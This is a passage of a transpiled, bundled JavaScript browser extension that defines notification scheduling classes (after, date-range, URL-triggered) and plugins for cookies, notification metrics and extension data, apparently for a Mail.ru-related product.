      result *= 60;
    case 's':
    default:
      result *= 1000;
  }
  return result;
}

},{}],85:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _baseNotificationSchedule = require('./base-notification-schedule');

var _baseNotificationSchedule2 = _interopRequireDefault(_baseNotificationSchedule);

var _notificationScheduleTypes = require('../constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

var _notificationScheduleParser = require('../notification-schedule-parser');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var AfterNotificationSchedule = function (_BaseNotificationSche) {
  _inherits(AfterNotificationSchedule, _BaseNotificationSche);

  function AfterNotificationSchedule(source) {
    _classCallCheck(this, AfterNotificationSchedule);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(AfterNotificationSchedule).call(this, _notificationScheduleTypes2.default.AFTER, source));
  }

  _createClass(AfterNotificationSchedule, [{
    key: 'getNextDate',
    value: function getNextDate() {
      return (0, _notificationScheduleParser.addTime)(new Date(), (0, _notificationScheduleParser.parseInterval)(this.__source.after));
    }
  }]);

  return AfterNotificationSchedule;
}(_baseNotificationSchedule2.default);

exports.default = AfterNotificationSchedule;

},{"../constants/notification-schedule-types":74,"../notification-schedule-parser":84,"./base-notification-schedule":86}],86:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _notificationScheduleParser = require('../notification-schedule-parser');

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var BaseNotificationSchedule = function () {
  function BaseNotificationSchedule(type, source) {
    _classCallCheck(this, BaseNotificationSchedule);

    this.__type = type;
    this.__source = source;
  }

  _createClass(BaseNotificationSchedule, [{
    key: 'getNextDate',
    value: function getNextDate() {
      return new Date();
    }
  }, {
    key: 'isAllowed',
    value: function isAllowed(_ref) {
      var displayCount = _ref.displayCount;
      var lastDisplayDate = _ref.lastDisplayDate;

      var withinLimits = this.__isWithinLimits(displayCount);
      var withinAllowedTimeInterval = this.__isWithinAllowedTimeInterval(lastDisplayDate);
      return withinLimits && withinAllowedTimeInterval;
    }
  }, {
    key: '__isWithinLimits',
    value: function __isWithinLimits(displayCount) {
      return this.__source.count > displayCount;
    }
  }, {
    key: '__isWithinAllowedTimeInterval',
    value: function __isWithinAllowedTimeInterval(lastDisplayDate) {
      return new Date().getTime() - lastDisplayDate.getTime() >= (0, _notificationScheduleParser.calculateIntervalInMilliseconds)((0, _notificationScheduleParser.parseInterval)(this.__source.limit));
    }
  }, {
    key: 'type',
    get: function get() {
      return this.__type;
    }
  }]);

  return BaseNotificationSchedule;
}();

exports.default = BaseNotificationSchedule;

},{"../notification-schedule-parser":84}],87:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _baseNotificationSchedule = require('./base-notification-schedule');

var _baseNotificationSchedule2 = _interopRequireDefault(_baseNotificationSchedule);

var _notificationScheduleTypes = require('../constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var DummyNotificationSchedule = function (_BaseNotificationSche) {
  _inherits(DummyNotificationSchedule, _BaseNotificationSche);

  function DummyNotificationSchedule(source) {
    _classCallCheck(this, DummyNotificationSchedule);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(DummyNotificationSchedule).call(this, _notificationScheduleTypes2.default.DUMMY, source));
  }

  _createClass(DummyNotificationSchedule, [{
    key: 'getNextDate',
    value: function getNextDate() {
      return new Date();
    }
  }]);

  return DummyNotificationSchedule;
}(_baseNotificationSchedule2.default);

exports.default = DummyNotificationSchedule;

},{"../constants/notification-schedule-types":74,"./base-notification-schedule":86}],88:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _dummyNotificationSchedule = require('./dummy-notification-schedule');

var _dummyNotificationSchedule2 = _interopRequireDefault(_dummyNotificationSchedule);

var _afterNotificationSchedule = require('./after-notification-schedule');

var _afterNotificationSchedule2 = _interopRequireDefault(_afterNotificationSchedule);

var _rangeNotificationSchedule = require('./range-notification-schedule');

var _rangeNotificationSchedule2 = _interopRequireDefault(_rangeNotificationSchedule);

var _urlNotificationSchedule = require('./url-notification-schedule');

var _urlNotificationSchedule2 = _interopRequireDefault(_urlNotificationSchedule);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = { DummyNotificationSchedule: _dummyNotificationSchedule2.default, AfterNotificationSchedule: _afterNotificationSchedule2.default, RangeNotificationSchedule: _rangeNotificationSchedule2.default, UrlNotificationSchedule: _urlNotificationSchedule2.default };

},{"./after-notification-schedule":85,"./dummy-notification-schedule":87,"./range-notification-schedule":89,"./url-notification-schedule":90}],89:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

var _baseNotificationSchedule = require('./base-notification-schedule');

var _baseNotificationSchedule2 = _interopRequireDefault(_baseNotificationSchedule);

var _notificationScheduleTypes = require('../constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

var _notificationScheduleParser = require('../notification-schedule-parser');

var _dateUtils = require('../../../utils/date-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var RangeNotificationSchedule = function (_BaseNotificationSche) {
  _inherits(RangeNotificationSchedule, _BaseNotificationSche);

  function RangeNotificationSchedule(source) {
    _classCallCheck(this, RangeNotificationSchedule);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(RangeNotificationSchedule).call(this, _notificationScheduleTypes2.default.RANGE, source));
  }

  _createClass(RangeNotificationSchedule, [{
    key: 'isAllowed',
    value: function isAllowed(_ref) {
      var displayCount = _ref.displayCount;
      var lastDisplayDate = _ref.lastDisplayDate;

      var createDateWithTime = function createDateWithTime(_ref2) {
        var hours = _ref2.hours;
        var minutes = _ref2.minutes;
        var seconds = _ref2.seconds;
        var milliseconds = _ref2.milliseconds;
        var initialDate = arguments.length <= 1 || arguments[1] === undefined ? null : arguments[1];

        var date = initialDate === null ? new Date() : new Date(initialDate);
        date.setSeconds(seconds || 0);
        date.setMilliseconds(milliseconds || 0);
        date.setHours(hours);
        date.setMinutes(minutes);
        return date;
      };

      var rangeIndex = this.__source.ranges.findIndex(function (range) {
        var now = new Date();
        var startDate = createDateWithTime((0, _notificationScheduleParser.parseTime)('00:00'), range.startDate);
        var endDate = createDateWithTime(_extends({}, (0, _notificationScheduleParser.parseTime)('23:59'), { seconds: 59, milliseconds: 999 }), range.endDate);
        var todayRangeStart = createDateWithTime((0, _notificationScheduleParser.parseTime)(range.startTime));
        var todayRangeEnd = createDateWithTime((0, _notificationScheduleParser.parseTime)(range.endTime));

        return (0, _dateUtils.isWithinRange)(now, startDate, endDate) && (0, _dateUtils.isWithinRange)(now, todayRangeStart, todayRangeEnd);
      });
      return _get(Object.getPrototypeOf(RangeNotificationSchedule.prototype), 'isAllowed', this).call(this, { displayCount: displayCount, lastDisplayDate: lastDisplayDate }) && rangeIndex > -1;
    }
  }]);

  return RangeNotificationSchedule;
}(_baseNotificationSchedule2.default);

exports.default = RangeNotificationSchedule;

},{"../../../utils/date-utils":100,"../constants/notification-schedule-types":74,"../notification-schedule-parser":84,"./base-notification-schedule":86}],90:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _baseNotificationSchedule = require('./base-notification-schedule');

var _baseNotificationSchedule2 = _interopRequireDefault(_baseNotificationSchedule);

var _notificationScheduleTypes = require('../constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

var _notificationScheduleParser = require('../notification-schedule-parser');

var _mathUtils = require('../../../utils/math-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var UrlNotificationSchedule = function (_BaseNotificationSche) {
  _inherits(UrlNotificationSchedule, _BaseNotificationSche);

  function UrlNotificationSchedule(source) {
    _classCallCheck(this, UrlNotificationSchedule);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(UrlNotificationSchedule).call(this, _notificationScheduleTypes2.default.URL, source));
  }

  _createClass(UrlNotificationSchedule, [{
    key: 'getNextDate',
    value: function getNextDate() {
      return (0, _notificationScheduleParser.addTime)(new Date(), { count: (0, _mathUtils.getRandomInt)(2, 10), units: 's' });
    }
  }, {
    key: 'urls',
    get: function get() {
      return this.__source.urls;
    }
  }]);

  return UrlNotificationSchedule;
}(_baseNotificationSchedule2.default);

exports.default = UrlNotificationSchedule;

},{"../../../utils/math-utils":102,"../constants/notification-schedule-types":74,"../notification-schedule-parser":84,"./base-notification-schedule":86}],91:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

var _extensionDataGenerator = require('./extension-data-generator');

var _extensionDataGenerator2 = _interopRequireDefault(_extensionDataGenerator);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var OneLinkExtensionDataGenerator = function (_ExtensionDataGenerat) {
  _inherits(OneLinkExtensionDataGenerator, _ExtensionDataGenerat);

  function OneLinkExtensionDataGenerator(cookieReader) {
    var additionalExtensionData = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];

    _classCallCheck(this, OneLinkExtensionDataGenerator);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(OneLinkExtensionDataGenerator).call(this, additionalExtensionData));

    _this.__cookieReader = cookieReader;
    return _this;
  }

  _createClass(OneLinkExtensionDataGenerator, [{
    key: 'generateExtensionData',
    value: function generateExtensionData() {
      var _this2 = this;

      return _get(Object.getPrototypeOf(OneLinkExtensionDataGenerator.prototype), 'generateExtensionData', this).call(this).then(function (extensionData) {
        return _this2.__cookieReader.getAllCookies().then(function (cookies) {
          var data = cookies.filter(function (cookie) {
            return cookie !== null;
          }).reduce(function (accumulator, cookie) {
            return _extends({}, accumulator, _defineProperty({}, 'old_' + cookie.name.toLowerCase(), decodeURIComponent(cookie.value)));
          }, {});
          return _extends({}, extensionData, data);
        });
      });
    }
  }]);

  return OneLinkExtensionDataGenerator;
}(_extensionDataGenerator2.default);

exports.default = OneLinkExtensionDataGenerator;

},{"./extension-data-generator":64}],92:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var BasePlugin = function () {
  function BasePlugin(name) {
    _classCallCheck(this, BasePlugin);

    this.__name = name;
    this.__host = null;
  }

  _createClass(BasePlugin, [{
    key: 'getName',
    value: function getName() {
      return this.__name;
    }
  }, {
    key: 'getHost',
    value: function getHost() {
      return this.__host;
    }
  }, {
    key: 'setHost',
    value: function setHost(host) {
      this.__host = host;
    }
  }, {
    key: 'run',
    value: function run() {
      return Promise.reject(new Error('Method should be overridden'));
    }
  }]);

  return BasePlugin;
}();

exports.default = BasePlugin;

},{}],93:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _longTermCookiePlugin = require('./long-term-cookie-plugin');

var _longTermCookiePlugin2 = _interopRequireDefault(_longTermCookiePlugin);

var _notificationsPlugin = require('./notifications-plugin');

var _notificationsPlugin2 = _interopRequireDefault(_notificationsPlugin);

var _onlineMetricsPlugin = require('./online-metrics-plugin');

var _onlineMetricsPlugin2 = _interopRequireDefault(_onlineMetricsPlugin);

var _pixelFetcherPlugin = require('./pixel-fetcher-plugin');

var _pixelFetcherPlugin2 = _interopRequireDefault(_pixelFetcherPlugin);

var _uninstallUrlPlugin = require('./uninstall-url-plugin');

var _uninstallUrlPlugin2 = _interopRequireDefault(_uninstallUrlPlugin);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = {
  LongTermCookiePlugin: _longTermCookiePlugin2.default,
  NotificationsPlugin: _notificationsPlugin2.default,
  OnlineMetricsPlugin: _onlineMetricsPlugin2.default,
  PixelFetcherPlugin: _pixelFetcherPlugin2.default,
  UninstallUrlPlugin: _uninstallUrlPlugin2.default
};

},{"./long-term-cookie-plugin":94,"./notifications-plugin":95,"./online-metrics-plugin":96,"./pixel-fetcher-plugin":97,"./uninstall-url-plugin":98}],94:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _basePlugin = require('./base-plugin');

var _basePlugin2 = _interopRequireDefault(_basePlugin);

var _dateUtils = require('../utils/date-utils');

var _paramUtils = require('../utils/param-utils');

var _queryString = require('../utils/query-string');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var LongTermCookiePlugin = function (_BasePlugin) {
  _inherits(LongTermCookiePlugin, _BasePlugin);

  function LongTermCookiePlugin(cookieFacade, scheduler) {
    _classCallCheck(this, LongTermCookiePlugin);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(LongTermCookiePlugin).call(this, 'LongTermCookiePlugin'));

    _this.__cookieFacade = cookieFacade;
    _this.__scheduler = scheduler;
    return _this;
  }

  _createClass(LongTermCookiePlugin, [{
    key: 'run',
    value: function run() {
      var _this2 = this;

      return this.getHost().getExtensionData().then(function (extensionData) {
        var cookieObject = { gp: extensionData.gp };
        if ((0, _paramUtils.isNotEmpty)(extensionData, 'hp_cnt')) {
          cookieObject.hp_cnt = extensionData.hp_cnt;
        }
        return _this2.__updateLongTermCookie((0, _queryString.convertObjectToQueryString)(cookieObject));
      });
    }
  }, {
    key: '__updateLongTermCookie',
    value: function __updateLongTermCookie(cookie) {
      var _this3 = this;

      return this.__cookieFacade.setCookie(cookie).then(function () {
        var alarmTime = (0, _dateUtils.tomorrowWithRandomTime)();
        _this3.__scheduler.schedule('UpdateCookie', alarmTime, _this3.__updateLongTermCookie.bind(_this3, cookie));
      });
    }
  }]);

  return LongTermCookiePlugin;
}(_basePlugin2.default);

exports.default = LongTermCookiePlugin;

},{"../utils/date-utils":100,"../utils/param-utils":103,"../utils/query-string":104,"./base-plugin":92}],95:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _each = require('async-es/each');

var _each2 = _interopRequireDefault(_each);

var _mrdsSettings = require('../constants/mrds-settings');

var _basePlugin = require('./base-plugin');

var _basePlugin2 = _interopRequireDefault(_basePlugin);

var _urlFetcher = require('../common/url-fetcher');

var _urlFetcher2 = _interopRequireDefault(_urlFetcher);

var _notificationScheduleTypes = require('../modules/notifications/constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

var _notificationFactory = require('../modules/notifications/factory/notification-factory');

var _notificationFactory2 = _interopRequireDefault(_notificationFactory);

var _notificationManager = require('../modules/notifications/notification-manager');

var _notificationManager2 = _interopRequireDefault(_notificationManager);

var _paramUtils = require('../utils/param-utils');

var _chromeUtils = require('../utils/chrome-utils');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var FetcherClass = (0, _urlFetcher.CredentialsMixin)(_urlFetcher2.default);
var BASE_NOTIFICATION_OPTIONS = {
  type: 'basic',
  isClickable: true
};

var NotificationsPlugin = function (_BasePlugin) {
  _inherits(NotificationsPlugin, _BasePlugin);

  function NotificationsPlugin(notificationConfigService, notificationHistoryManager, scheduler, urlWatcher, metricSender) {
    _classCallCheck(this, NotificationsPlugin);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(NotificationsPlugin).call(this, 'NotificationsPlugin'));

    _this.__notificationConfigService = notificationConfigService;
    _this.__notificationHistoryManager = notificationHistoryManager;
    _this.__scheduler = scheduler;
    _this.__urlWatcher = urlWatcher;
    _this.__metricSender = metricSender;
    _this.__baseMetricOptions = { type: 'notification' };
    return _this;
  }

  _createClass(NotificationsPlugin, [{
    key: 'run',
    value: function run() {
      var _this2 = this;

      return this.getHost().getExtensionData().then(function (extensionData) {
        _this2.__baseMetricOptions = _extends({}, _this2.__baseMetricOptions, (0, _paramUtils.createMapper)(_mrdsSettings.MAPPINGS)(_paramUtils.filter.apply(undefined, [extensionData].concat(_toConsumableArray(_mrdsSettings.EXCLUDED_FIELDS)))));
        return _this2.__notificationConfigService.getConfig().then(function (notifications) {
          return new Promise(function (resolve) {
            // Filter out disabled configurations
            var enabledNotifications = notifications.filter(function (configuration) {
              return configuration.enabled;
            });
            var iteratee = function iteratee(configuration, callback) {
              switch (configuration.schedule.type) {
                case _notificationScheduleTypes2.default.URL:
                  _this2.__scheduleNotificationByUrl(configuration);
                  break;
                case _notificationScheduleTypes2.default.RANGE:
                  _this2.__scheduleNotificationByDateRange(configuration);
                  break;
                case _notificationScheduleTypes2.default.AFTER:
                default:
                  _this2.__scheduleNotificationOnce(configuration);
              }
              callback(null);
            };
            // Loop through all notification entries asynchronously
            (0, _each2.default)(enabledNotifications, iteratee, resolve);
          });
        });
      });
    }
  }, {
    key: '__createAndDisplayNotification',
    value: function __createAndDisplayNotification(configurationId, notificationOptions) {
      var notification = this.__createNotificationObject(notificationOptions);
      return this.__displayNotification(configurationId, notification, notificationOptions.onCreated);
    }
  }, {
    key: '__createNotificationObject',
    value: function __createNotificationObject(_ref) {
      var _this3 = this;

      var options = _ref.options;
      var url = _ref.url;

      return (0, _notificationFactory2.default)({
        options: options,
        onClicked: function onClicked(notificationId) {
          _this3.__createTab(url).then(function () {
            return _this3.__sendMetric('click');
          }).then(function () {
            return _notificationManager2.default.destroy(notificationId);
          });
        },
        onClosed: function onClosed(byUser, notificationId) {
          _this3.__sendMetric('close').then(function () {
            return _notificationManager2.default.destroy(notificationId);
          });
        }
      });
    }
  }, {
    key: '__displayNotification',
    value: function __displayNotification(configurationId, _ref2, onCreated) {
      var _this4 = this;

      var id = _ref2.id;
      var options = _ref2.options;

      return _notificationManager2.default.create(id, options).then(function () {
        return _this4.__fetchRbUrl(onCreated);
      }).then(function () {
        return _this4.__sendMetric('show');
      }).then(function () {
        return _this4.__notificationHistoryManager.logNotificationDisplay(configurationId);
      });
    }
  }, {
    key: '__configurationIsAllowed',
    value: function __configurationIsAllowed(configuration) {
      return this.__notificationHistoryManager.getNotificationHistory(configuration.id).then(function (history) {
        return configuration.schedule.isAllowed(history);
      });
    }
  }, {
    key: '__getConfigurationContent',
    value: function __getConfigurationContent(configuration) {
      return configuration.getContent().then(function (content) {
        if (content === null) {
          return null;
        }
        var type = content.type;
        var title = content.title;
        var message = content.message;
        var iconUrl = content.iconUrl;
        var url = content.url;
        var onCreated = content.onCreated;

        var options = _extends({}, BASE_NOTIFICATION_OPTIONS, { type: type, title: title, message: message, iconUrl: iconUrl });
        return { options: options, url: url, onCreated: onCreated };
      });
    }
  }, {
    key: '__prepareNotification',
    value: function __prepareNotification(configuration) {
      var _this5 = this;

      return this.__getConfigurationContent(configuration).then(function (content) {
        if (content === null) {
          return console.error('Notification content is not available');
        }
        console.info('Notification content is available', content);
        return _this5.__createAndDisplayNotification(configuration.id, content);
      });
    }
  }, {
    key: '__scheduleNotificationByDateRange',
    value: function __scheduleNotificationByDateRange(configuration) {
      var _this6 = this;

      return this.__scheduleNotificationOnce(configuration).then(function () {
        console.info('Scheduling next range notification check');
        var date = new Date();
        date.setHours(date.getHours() + 3);
        _this6.__scheduler.schedule('next_range_check', date, _this6.__scheduleNotificationByDateRange.bind(_this6, configuration));
      });
    }
  }, {
    key: '__scheduleNotificationByUrl',
    value: function __scheduleNotificationByUrl(configuration) {
      var _this7 = this;

      this.__urlWatcher.watch(configuration.schedule.urls /*[ '*://mail.ru/!*', '*://www.mail.ru/!*' ]*/, function () {
        console.info('URL pattern match, schedule notifications');
        _this7.__scheduleNotificationOnce(configuration);
      });
      return Promise.resolve(true);
    }
  }, {
    key: '__scheduleNotificationOnce',
    value: function __scheduleNotificationOnce(configuration) {
      var _this8 = this;

      return this.__configurationIsAllowed(configuration).then(function (isAllowed) {
        if (!isAllowed) {
